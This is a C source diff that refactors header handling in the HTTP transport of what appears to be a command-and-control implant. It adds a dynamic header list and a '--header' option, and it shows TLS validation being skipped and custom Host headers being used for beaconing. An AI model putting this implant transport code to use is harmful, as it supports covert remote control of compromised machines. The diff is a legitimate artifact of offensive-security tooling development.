@@ -17,7 +17,7 @@ struct http_ctx {
 	struct c2_transport *t;
 	char *uri;
 	struct ev_timer poll_timer;
-	char * headers[2];
+	char ** headers;
 	struct http_request_data data;
 	struct http_request_opts opts;
 	struct buffer_queue *egress;
@@ -122,13 +122,27 @@ void http_ctx_free(struct http_ctx *ctx)
 		}
 		free(ctx->uri);
 		for (int i = 0; i < ctx->data.num_headers; i++) {
-			free(ctx->data.headers[i]);
+			free(ctx->headers[i]);
 		}
+		free(ctx->headers);
 		free(ctx->data.ua);
 		free(ctx->data.referer);
 		free(ctx->data.cookie_list);
 		free(ctx);
 	}
+}
+
+static int add_header(struct http_ctx *ctx, const char *header)
+{
+	ctx->headers = reallocarray(ctx->headers, ctx->data.num_headers + 1,
+			sizeof(char *));
+	if (ctx->headers) {
+		if ((ctx->headers[ctx->data.num_headers] = strdup(header))) {
+			ctx->data.num_headers++;
+			return 0;
+		}
+	}
+	return -1;
 }
 
 int http_transport_init(struct c2_transport *t)
@@ -147,8 +161,7 @@ int http_transport_init(struct c2_transport *t)
 	ctx->data.content_type = "application/octet-stream";
 	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;
 
-	ctx->data.num_headers = 1;
-	ctx->headers[0] = strdup("Connection: close");
+	add_header(ctx, "Connection: close");
 
 	char *args = strchr(ctx->uri, '|');
 	if (args) {
@@ -158,9 +171,10 @@ int http_transport_init(struct c2_transport *t)
 			char **argv = argv_split(args, NULL, &argc);
 			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
 				if (strcmp(argv[i], "--host") == 0) {
-					if (asprintf(&ctx->headers[ctx->data.num_headers],
-						"Host: %s", argv[i + 1]) > 0) {
-						ctx->data.num_headers++;
+					char *host_header = NULL;
+					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
+						add_header(ctx, host_header);
+						free(host_header);
 					}
 				}
 				if (strcmp(argv[i], "--ua") == 0) {
@@ -174,6 +188,10 @@ int http_transport_init(struct c2_transport *t)
 				if (strcmp(argv[i], "--cookie") == 0) {
 					ctx->data.cookie_list = strdup(argv[i + 1]);
 					log_info("cookie: %s", ctx->data.cookie_list);
+				}
+				if (strcmp(argv[i], "--header") == 0) {
+					add_header(ctx, argv[i + 1]);
+					log_info("header: %s", argv[i + 1]);
 				}
 			}
 		}
